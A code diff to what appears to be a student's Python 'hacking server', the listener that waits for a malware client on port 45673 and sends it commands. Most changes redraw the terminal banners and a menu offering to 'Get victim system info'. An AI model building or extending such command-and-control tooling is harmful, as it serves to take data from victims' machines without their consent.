@@ -27,6 +27,80 @@ def styled_print(message :str, color : bcolors) -> None:
         NONE
     """
     print(color+message+bcolors.ENDC)
+def print_top():
+    """Print app screen
+    """
+    styled_print("-"*100+" Welcome to hacikng server "+"-"*100,bcolors.OKGREEN)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"Author: Mohamad choupan 9831125"+" "*97+"|"+bcolors.ENDC)
+
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+
+def print_waiting():
+    """Print waiting screen
+    """
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"="*31+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+"  Waiting for Malware start  "+"|"+" "*97+"|"+bcolors.ENDC)
+    
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"="*31+" "*97+"|"+bcolors.ENDC)
+
+def print_down():
+    """Print down screen
+    """
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+
+
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+    styled_print("-"*99+" Thank you for using our app "+"-"*99,bcolors.OKGREEN)
+
+def print_connected()->str:
+    print(bcolors.BOLD+bcolors.FAIL+"|"+" "*99+"Malware connected to server"+" "*99+"|"+bcolors.ENDC)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"="*31+" "*30+"="*31+" "*30+"="*31+" "*36+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC) 
+    print(bcolors.BOLD+bcolors.WARNING+"|"+" "*36+"|"+"  1) Get victim system info  "+"|"+" "*30+"|"+"           2) Exit           "+"|"+" "*30+"|"+"        3) Close app         "+"|"+" "*36+"|"+bcolors.ENDC)
+
+
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*30+"|"+" "*29+"|"+" "*36+"|"+bcolors.ENDC) 
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*36+"="*31+" "*30+"="*31+" "*30+"="*31+" "*36+"|"+bcolors.ENDC)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+    styled_print("|"+" "*225+"|",bcolors.OKGREEN)
+
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"="*31+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|",end="")
+    user_input=input(bcolors.BOLD+bcolors.OKGREEN+"       Enter your choice: ")
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    
+    
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"="*31+" "*97+"|"+bcolors.ENDC)
+    return user_input
+
+def print_wrong():
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"="*31+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.FAIL+"|"+" "*97+"|"+"     Wrong input entered     "+"|"+" "*97+"|"+bcolors.ENDC)
+    
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"|"+" "*29+"|"+" "*97+"|"+bcolors.ENDC)
+    print(bcolors.BOLD+bcolors.OKGREEN+"|"+" "*97+"="*31+" "*97+"|"+bcolors.ENDC)
 
 def create_server(ip :str, port :str) ->socket :
     """Create socket server
@@ -124,14 +198,21 @@ def input_data() -> dict:
         dict: input data
     """
     data={}
-    styled_print("What you want to do :) ? ",bcolors.OKGREEN)
-    styled_print("1) get info",bcolors.OKGREEN)
-    styled_print("2) exit",bcolors.OKGREEN)
-    user_input=input("Enter command: ")
+    print_top()
+    user_input=print_connected()
+    print_down()
+
     if user_input=="1":
         data["command"]="sysinfo"
     elif user_input=="2":
         data["command"]="exit"
+    elif user_input=="3":
+        exit()
+    else:
+        print_top()
+        print_wrong()
+        print_down()
+        input_data()
     return data
 def accpet_client_data(connection : connection) -> None:
     """accept client data and send command to client
@@ -143,7 +224,6 @@ def accpet_client_data(connection : connection) -> None:
     """
     while True:
         try:
-            styled_print("malware succesfullt connected :))))))", bcolors.OKGREEN)
             input=input_data()
             input=json_convert(input)
             send_command(connection,input)
@@ -154,23 +234,12 @@ def accpet_client_data(connection : connection) -> None:
             connection.close()
             break    
 
-def print_Title():
-    """Print title of app
-    """
-    styled_print("="*50+" Welcome to hacikng server "+"="*50,bcolors.OKGREEN)
-    styled_print("="*130,bcolors.FAIL)
-    styled_print("="*50+" Author : Mohammad choupan "+"="*50,bcolors.OKGREEN)
-    styled_print("="*130,bcolors.FAIL)
-    styled_print("="*50+" Waiting for connect client "+"="*50,bcolors.OKGREEN)
-    styled_print("="*130,bcolors.FAIL)
-
-
-
 
 
 if __name__== '__main__':
-    print_Title()
-
+    print_top()
+    print_waiting()
+    print_down()
     server=create_server('0.0.0.0',45673)
     
     while True:
